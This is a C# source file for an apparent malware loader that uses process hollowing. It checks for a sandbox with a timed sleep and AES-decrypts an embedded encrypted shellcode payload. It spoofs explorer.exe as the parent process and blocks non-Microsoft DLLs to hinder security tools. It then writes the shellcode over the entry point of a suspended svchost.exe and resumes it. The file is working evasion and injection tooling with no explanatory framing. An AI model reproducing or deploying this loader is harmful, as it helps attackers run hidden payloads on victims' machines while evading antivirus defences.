using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Hollow
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, CreationFlags dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }
        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }
        [Flags]
        public enum CreationFlags : uint
        {
            CreateSuspended = 0x00000004,
            DetachedProcess = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }

            string MyKey = "F4-D7-FC-A6-94-E0-EE-CF-35-F7-56-98-B3-95-AF-96-D0-CB-17-2F-45-0D-4D-5A-12-B6-BC-F4-A1-1A-B9-7B";
            string Myiv = "5F-3C-78-8C-C6-94-5E-6E-DB-7D-66-C9-71-B8-9C-5E";
            byte[] buf = new byte[1536] {0xc9, 0x4d, 0x30, 0x15, 0x16, 0xaa, 0x04, 0x7e, 0xbb, 0xd0, 0x71, 0x63, 0x5e, 0x62, 0xb8, 0x63, 0xd5, 0x26, 0x20, 0x41, 0x41, 0x63, 0x8b, 0x9c, 0x42, 0xf8, 0xaa, 0x72, 0xb6, 0xf1, 0x08, 0x5d, 0x1e, 0xb8, 0x40, 0x0f, 0xb1, 0x7f, 0x1b, 0xa5, 0x7a, 0x5e, 0xe6, 0x20, 0xc7, 0xf7, 0xf7, 0xe6, 0x3f, 0xdc, 0x3c, 0x14, 0xc2, 0x4b, 0x83, 0xa1, 0x7f, 0x55, 0xb3, 0x51, 0xfd, 0x36, 0x45, 0xd3, 0x39, 0x5c, 0x5a, 0xf7, 0xa1, 0x30, 0xff, 0xbf, 0x2b, 0xf9, 0xc8, 0x3c, 0x45, 0xd2, 0x6e, 0x60, 0x15, 0xdf, 0x0f, 0x30, 0xd4, 0xc6, 0x1f, 0x9c, 0xe3, 0x71, 0x6b, 0x52, 0x93, 0xc4, 0xf1, 0xa4, 0x26, 0x32, 0x4f, 0x08, 0x4d, 0x28, 0xac, 0x4a, 0x5b, 0x82, 0x0b, 0xe9, 0xfd, 0x13, 0x29, 0xef, 0x1b, 0x07, 0x4e, 0x69, 0xa5, 0xbb, 0x54, 0x59, 0x6a, 0x6e, 0x16, 0x3d, 0x97, 0x8c, 0xe9, 0x19, 0xb8, 0xfb, 0xa4, 0x80, 0x25, 0x7e, 0xcb, 0x39, 0x6d, 0x1c, 0xee, 0x8e, 0x56, 0x22, 0x86, 0x87, 0xe1, 0xb6, 0xe3, 0x1f, 0x3c, 0xc2, 0x29, 0x42, 0xf1, 0xd7, 0x07, 0xba, 0x91, 0x18, 0xb3, 0x5a, 0xa8, 0xe7, 0x29, 0x98, 0xd5, 0xc3, 0xc5, 0x1d, 0x74, 0xe2, 0x28, 0x85, 0x1d, 0x04, 0xaa, 0xea, 0x92, 0x93, 0x09, 0x84, 0x5f, 0xec, 0x8a, 0x22, 0x57, 0xc8, 0x96, 0x98, 0xe4, 0x99, 0x27, 0x3a, 0xb3, 0xb1, 0x06, 0x80, 0x29, 0x68, 0x38, 0xef, 0x42, 0x64, 0xfc, 0xe0, 0x34, 0x16, 0x79, 0x27, 0xc8, 0x51, 0xf6, 0x68, 0x81, 0x94, 0x00, 0x6a, 0x89, 0x3f, 0x25, 0x91, 0xab, 0x67, 0x5c, 0x36, 0xff, 0xe1, 0x22, 0x7f, 0x94, 0x03, 0xe2, 0x23, 0x58, 0xb8, 0xe4, 0x58, 0x3f, 0x68, 0x60, 0x62, 0x3e, 0x8f, 0x09, 0x63, 0x91, 0xd9, 0x51, 0xde, 0x83, 0x6d, 0xb0, 0xef, 0xa8, 0xdd, 0x73, 0x10, 0x6d, 0x51, 0x69, 0xc2, 0x6d, 0x5a, 0x29, 0x77, 0xe6, 0x7e, 0x60, 0xa0, 0x9f, 0x49, 0xcd, 0x04, 0xc3, 0x47, 0x38, 0x58, 0xd3, 0xfb, 0xbe, 0xae, 0xc0, 0x16, 0xe0, 0x59, 0xeb, 0xad, 0x38, 0x37, 0xe4, 0x5b, 0x16, 0xbd, 0x80, 0xb0, 0x61, 0x11, 0xc7, 0x82, 0xad, 0xdb, 0xe6, 0x24, 0x32, 0xdc, 0x04, 0x21, 0xbc, 0xe3, 0xe6, 0x6d, 0xf8, 0xd7, 0x2c, 0x17, 0xd1, 0xdb, 0x9b, 0x73, 0x25, 0xfd, 0x22, 0xa6, 0xe7, 0xa3, 0x1b, 0x97, 0x83, 0xd9, 0x09, 0x1e, 0x0e, 0x6f, 0xaa, 0x86, 0x1f, 0x09, 0xe6, 0x4e, 0x74, 0x55, 0xbf, 0x99, 0x15, 0x80, 0x3c, 0xc3, 0x4d, 0x5a, 0x73, 0xab, 0x9b, 0x39, 0x92, 0xb5, 0xab, 0x15, 0x53, 0x32, 0x9b, 0x84, 0xd8, 0x28, 0xa2, 0xfb, 0xe9, 0xb7, 0xc0, 0xad, 0xd6, 0x29, 0x8e, 0xcf, 0x84, 0x5f, 0x37, 0x35, 0xf9, 0x37, 0xbb, 0xa7, 0x3a, 0x8e, 0x93, 0xed, 0x57, 0x02, 0xb5, 0x87, 0x85, 0xb1, 0xb8, 0xd8, 0x46, 0xbe, 0xe8, 0x1f, 0x42, 0x4d, 0xac, 0x47, 0x9a, 0xca, 0x4c, 0x12, 0xd3, 0xee, 0x39, 0x57, 0x80, 0x5f, 0x3a, 0x28, 0xfa, 0x61, 0xb1, 0xd7, 0x9e, 0x70, 0x78, 0x27, 0x87, 0xcd, 0xdc, 0xff, 0x36, 0x0c, 0x79, 0x41, 0x09, 0xcc, 0x46, 0x21, 0x88, 0x62, 0x6d, 0x83, 0xf5, 0x2d, 0x99, 0x6f, 0xa5, 0x62, 0xba, 0xe8, 0x2f, 0x88, 0x64, 0x87, 0x88, 0x62, 0x0f, 0xbc, 0x25, 0xd1, 0xc3, 0xc0, 0x9f, 0x89, 0x81, 0x9c, 0x8f, 0xf5, 0x3d, 0x96, 0xd3, 0x0f, 0x67, 0x51, 0xf1, 0x64, 0x73, 0x53, 0xa0, 0xac, 0xd8, 0x92, 0xf1, 0x2b, 0x8a, 0xc3, 0xc9, 0xfe, 0x74, 0xb3, 0x9c, 0x21, 0x57, 0xd5, 0x2d, 0x29, 0x90, 0x68, 0xea, 0xdb, 0xf3, 0x2d, 0xa1, 0xf4, 0xae, 0x2f, 0xa9, 0xff, 0xce, 0x78, 0x67, 0xb7, 0xd6, 0xbe, 0x5d, 0xc2, 0xa0, 0xc4, 0x84, 0x5e, 0xe2, 0xc2, 0xed, 0xc9, 0x52, 0x82, 0x4f, 0x03, 0x56, 0x44, 0xb8, 0xaa, 0xb5, 0xa3, 0x7f, 0xe6, 0xef, 0xc3, 0x73, 0x99, 0x99, 0xe6, 0x24, 0xce, 0xd8, 0xc7, 0x36, 0xaa, 0x3e, 0xc5, 0x04, 0x5e, 0xa8, 0x20, 0x8b, 0xe5, 0xb3, 0x8e, 0x6c, 0x74, 0xdc, 0x05, 0xbc, 0xd6, 0x46, 0x49, 0x2b, 0xca, 0xb8, 0x9e, 0x18, 0x7c, 0x4c, 0x6b, 0x71, 0x54, 0x2b, 0xbf, 0x8c, 0x4b, 0xbd, 0xf9, 0x16, 0x68, 0xe1, 0xe0, 0xb3, 0x32, 0xa2, 0xed, 0x93, 0x17, 0x0f, 0xdc, 0x98, 0xdf, 0x27, 0x1f, 0xa4, 0x0f, 0xb2, 0x3d, 0xdf, 0x0d, 0x80, 0x4f, 0xce, 0xce, 0x19, 0x56, 0xdf, 0x52, 0x8b, 0xaa, 0x70, 0x87, 0x7c, 0xcf, 0xe4, 0x3b, 0x57, 0xbe, 0xfa, 0x40, 0x21, 0xa2, 0x25, 0xfe, 0xc9, 0x43, 0x3e, 0xdb, 0x2e, 0x53, 0x4f, 0x76, 0xce, 0x03, 0xd7, 0x40, 0x74, 0x92, 0x24, 0x75, 0x43, 0xa5, 0x6d, 0x44, 0x79, 0x09, 0x9f, 0x29, 0x5c, 0x49, 0x46, 0x51, 0x4b, 0x37, 0x55, 0x9e, 0x22, 0xeb, 0x41, 0x6e, 0x1a, 0xd1, 0xaf, 0x8c, 0x0f, 0x35, 0x0c, 0x6f, 0x92, 0x37, 0x20, 0xa7, 0x9a, 0x99, 0x24, 0x0c, 0x8f, 0x84, 0x94, 0x14, 0xeb, 0x07, 0x8a, 0xd5, 0x63, 0xd7, 0x02, 0x82, 0x0d, 0x5a, 0x36, 0xf9, 0x72, 0x84, 0x70, 0x0e, 0x20, 0xb2, 0x08, 0xfd, 0x62, 0x0b, 0x19, 0xd2, 0x55, 0x97, 0xca, 0x9c, 0xd7, 0x52, 0x95, 0x06, 0x49, 0xee, 0x96, 0xa5, 0xf8, 0x05, 0x37, 0x0e, 0x35, 0x43, 0x63, 0xa4, 0x8b, 0xd0, 0xb5, 0xe0, 0xc9, 0xe2, 0xb3, 0xc9, 0x2c, 0xb6, 0xf7, 0xdf, 0x7e, 0x14, 0x0e, 0x63, 0xfc, 0xc2, 0xf9, 0x6c, 0x10, 0xeb, 0x34, 0x96, 0xcc, 0x46, 0xa2, 0x6b, 0x60, 0x70, 0xc6, 0xca, 0xed, 0xe5, 0x8a, 0x27, 0xc8, 0x0b, 0x4e, 0x6d, 0xd5, 0xaf, 0x32, 0x3f, 0xb9, 0xbc, 0x83, 0xc2, 0x13, 0x7e, 0x57, 0x55, 0xa2, 0x3f, 0x79, 0xca, 0x0a, 0xaf, 0xf6, 0x74, 0xa1, 0xfb, 0x1b, 0xd4, 0x76, 0xe8, 0x0c, 0x05, 0x64, 0xd0, 0x41, 0xe3, 0x0a, 0x58, 0xf9, 0x61, 0xd6, 0x8d, 0x7b, 0x6c, 0x5e, 0x65, 0x6d, 0xff, 0x58, 0x31, 0x23, 0xb8, 0x4e, 0x9d, 0x40, 0x3d, 0x35, 0xdb, 0x65, 0x97, 0xe8, 0xf4, 0x7e, 0xcf, 0x5e, 0xab, 0xd1, 0x55, 0x9e, 0x8d, 0x16, 0x75, 0xa1, 0x97, 0xe6, 0xf4, 0x1c, 0xdb, 0x0f, 0xd6, 0xd9, 0x8a, 0xc7, 0xe0, 0xd5, 0x52, 0x34, 0xa5, 0x95, 0x10, 0xcd, 0xcb, 0x3c, 0xb6, 0x67, 0xc3, 0xdb, 0xb9, 0x9d, 0x44, 0x72, 0xed, 0x96, 0xf1, 0x49, 0x38, 0xf9, 0x2d, 0x7e, 0x14, 0x92, 0xb0, 0x30, 0xb5, 0xf7, 0xad, 0xab, 0xf7, 0x8c, 0x3b, 0xa4, 0x91, 0xd7, 0xd8, 0x8e, 0x2f, 0xb5, 0xfb, 0x7d, 0xb1, 0x43, 0x84, 0x5d, 0x6c, 0x1d, 0x93, 0xdb, 0xd8, 0x56, 0x97, 0xdc, 0x66, 0x3a, 0x45, 0x56, 0x61, 0xc5, 0x45, 0x51, 0xbc, 0xf7, 0xa4, 0x9f, 0xa7, 0x4d, 0x03, 0xc6, 0x8e, 0x13, 0x18, 0xbc, 0x7d, 0x90, 0x8f, 0x99, 0x91, 0xcf, 0x93, 0x47, 0x3d, 0xd0, 0xb7, 0xc9, 0x3a, 0x90, 0xc3, 0xfb, 0x5a, 0x1c, 0xcc, 0xa5, 0x5e, 0xbb, 0x18, 0x3d, 0xee, 0x9e, 0xac, 0xcd, 0x9d, 0x1c, 0x2a, 0x41, 0x28, 0x6a, 0x86, 0x03, 0x2a, 0xc1, 0xce, 0x29, 0x5c, 0xf1, 0x00, 0x0e, 0xec, 0xd1, 0xd8, 0x55, 0xd2, 0x9d, 0x76, 0xf0, 0x36, 0x43, 0x5d, 0xe4, 0x97, 0xf5, 0x44, 0x5a, 0xf5, 0x14, 0x84, 0x8d, 0xe4, 0xbe, 0xd3, 0xb0, 0x19, 0xaf, 0x8a, 0xe7, 0x7e, 0x99, 0x95, 0x2c, 0xf5, 0xfb, 0xea, 0x31, 0xbf, 0x82, 0xde, 0x07, 0x43, 0x33, 0xb9, 0x56, 0x1d, 0x66, 0x56, 0xab, 0x39, 0x5b, 0x44, 0xf1, 0x5b, 0x71, 0xda, 0x1d, 0xbf, 0x8e, 0x6c, 0x28, 0x3a, 0xe7, 0xa5, 0xba, 0x25, 0x61, 0xfb, 0xdb, 0x71, 0x07, 0x55, 0x90, 0x24, 0x0c, 0x28, 0x79, 0x34, 0x33, 0x1b, 0x15, 0x78, 0x21, 0x90, 0xd6, 0x07, 0x64, 0x53, 0x14, 0x9f, 0xfd, 0xcc, 0x2d, 0x1b, 0xcc, 0xd8, 0x6f, 0xe3, 0x36, 0xb1, 0x82, 0x6f, 0x97, 0x9a, 0x5c, 0x54, 0x4b, 0x4f, 0xeb, 0x4f, 0xce, 0xe6, 0xbc, 0xea, 0x6f, 0xa0, 0x97, 0xd2, 0x05, 0xe2, 0x38, 0x4d, 0x10, 0xde, 0x5e, 0xa1, 0x5e, 0x76, 0x48, 0xba, 0xb2, 0xf1, 0xfa, 0x7c, 0x38, 0x40, 0xe2, 0x98, 0x03, 0x9c, 0x5c, 0xdb, 0xde, 0xe7, 0x9a, 0x15, 0x89, 0xa2, 0x80, 0x39, 0xec, 0x59, 0x94, 0x9b, 0x39, 0x05, 0x7b, 0x1f, 0x22, 0x92, 0x84, 0x26, 0x71, 0x64, 0x71, 0x5c, 0xd4, 0xdd, 0x48, 0xf1, 0x4b, 0x00, 0x54, 0x83, 0x65, 0x3b, 0x69, 0x93, 0x19, 0xb9, 0x6f, 0x88, 0x72, 0x92, 0x1f, 0x50, 0x49, 0xb9, 0xd2, 0x69, 0xfc, 0xef, 0x6e, 0x9d, 0xe1, 0xb3, 0x5f, 0x2f, 0xa8, 0x6d, 0xca, 0x60, 0xbe, 0x52, 0x8c, 0x91, 0x71, 0xfb, 0x46, 0x8f, 0x41, 0xaa, 0xb1, 0xf2, 0x59, 0x0a, 0xe5, 0xa3, 0xe1, 0x41, 0x7a, 0xe7, 0x39, 0xf6, 0x1b, 0xe0, 0x99, 0x59, 0x6f, 0x76, 0x68, 0x8d, 0xc2, 0x7a, 0xbc, 0x34, 0xd1, 0x05, 0x63, 0xe1, 0xfb, 0x25, 0x2e, 0x02, 0x0a, 0x1b, 0x45, 0x2d, 0x9a, 0x08, 0x46, 0xf3, 0x0d, 0xde, 0xf2, 0xe7, 0x14, 0xad, 0x37, 0x9c, 0x3f, 0x24, 0x11, 0x2e, 0x46, 0x5a, 0xc6, 0x2c, 0x2d, 0xe6, 0xb2, 0x6d, 0x37, 0x97, 0x45, 0xe0, 0x63, 0x16, 0xd7, 0xce, 0xa4, 0x91, 0x3e, 0xd3, 0xe7, 0xf8, 0x5c, 0x71, 0x4c, 0x04, 0x97, 0xff, 0x8c, 0xf0, 0x29, 0x3f, 0x55, 0x74, 0x44, 0x53, 0x0c, 0x1a, 0x74, 0x47, 0x65, 0xb4, 0xc4, 0x77, 0xda, 0xe8, 0x08, 0x8f, 0x09, 0x59, 0x5a, 0x29, 0xea, 0x5f, 0x35, 0x0b, 0xb8, 0xbb, 0x3a, 0xf1, 0x43, 0x53, 0x20, 0x92, 0x61, 0x3e, 0xd8, 0x88, 0x03, 0xdb, 0xd9, 0x33, 0xd7, 0xe4, 0x35, 0x0b, 0x5a, 0x28, 0x41, 0xdb, 0x75, 0xd1, 0x60, 0x9a, 0x7a, 0xcb, 0xa8, 0xbd, 0xd1, 0x14, 0xdb, 0x57, 0xed, 0x91, 0x94, 0x74, 0x99, 0x77, 0xf3, 0x92, 0xa2, 0x3b, 0x2c, 0xe4, 0xa0, 0x6f, 0xb4, 0xda, 0x21, 0xd8, 0x23, 0x11, 0xd8, 0xc4, 0x40, 0xec, 0x10, 0x3b, 0xdf, 0xff, 0xe2, 0xbe, 0xbe, 0xae, 0xec, 0xff, 0x4e, 0x3f, 0x04, 0x90, 0x65, 0x51, 0xaf, 0x8d, 0x58, 0xe4, 0xe4, 0xff, 0x63, 0x65, 0x9b, 0xda, 0x0c, 0x78, 0xe4, 0xff, 0xd3, 0xa0, 0x99, 0x2e, 0xb6, 0xd2, 0x3e, 0x35, 0xdd, 0xa5, 0xe4, 0x4e, 0x94, 0xf0, 0x82, 0x78, 0x47, 0x06, 0x2d, 0x8e, 0xd3, 0x68, 0x05, 0x42, 0x3a, 0xdb, 0x13, 0xc2, 0x97, 0x9d, 0xf7, 0x55, 0xc5, 0xad, 0x23, 0x4b, 0x91, 0x62, 0xdf, 0xe7, 0xcd, 0xb4, 0x89, 0xae, 0x5a, 0x57, 0x0a, 0xa3, 0xea, 0xf5, 0x4c, 0x10, 0x33, 0xdc, 0xa6, 0xee, 0x83, 0x8f, 0x6d, 0x08, 0x6b, 0xb0, 0x0d, 0x63, 0x8a, 0xd5, 0x0f, 0x3d, 0xf3, 0x18, 0xf4, 0x77, 0x52, 0xbb, 0x5d, 0x83, 0x03, 0x66, 0xa9, 0xa5, 0x40, 0xb6, 0x19, 0x56, 0xc2, 0x0a, 0xb2, 0xde, 0x62, 0x87, 0x81, 0xcf, 0x6e, 0x6a, 0x0b, 0x9d, 0x59, 0xb0, 0xcb, 0x65, 0x2e, 0x8b, 0xdb, 0x8b, 0x70, 0x9a, 0xaf, 0xf0, 0x16, 0x01, 0x1e, 0x97, 0xc9, 0x9d, 0x19, 0xdf, 0xb5, 0xdd, 0xca, 0xd2, 0x9b, 0x2c, 0xd0, 0xf7, 0xbe, 0xb5, 0x6d, 0xf7, 0xb7, 0x7a, 0xf3, 0x8a, 0x78, 0xba, 0xca, 0x75, 0x24, 0x43, 0xcf, 0xd2, 0x23, 0x84, 0xbf, 0xb8, 0xb1, 0x65, 0x36, 0xd9, 0xa6, 0xa6, 0x41, 0xf1, 0x1b, 0xc8, 0xdc, 0xef, 0x64, 0xe3, 0x31, 0xa4, 0x23, 0x77, 0xb5, 0xa4};
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);

            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            var startInfoEx = new STARTUPINFOEX();
            var pi = new PROCESS_INFORMATION();
            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var processSecurity = new SECURITY_ATTRIBUTES();
                var threadSecurity = new SECURITY_ATTRIBUTES();
                processSecurity.nLength = Marshal.SizeOf(processSecurity);
                threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );

                var parentHandle = Process.GetProcessesByName("explorer")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );
                CreateProcess(
                    null,
                    "C:\\windows\\system32\\svchost.exe",
                    ref processSecurity,
                    ref threadSecurity,
                    false,
                    0x00080004,
                    IntPtr.Zero,
                    null,
                    ref startInfoEx,
                    out pi
                    );
            }
            catch (Exception error)
            {
                Console.Error.WriteLine("error" + error.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            WriteProcessMemory(hProcess, addressOfEntryPoint, e, e.Length, out nRead);
            ResumeThread(pi.hThread);
        }
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }
    }
}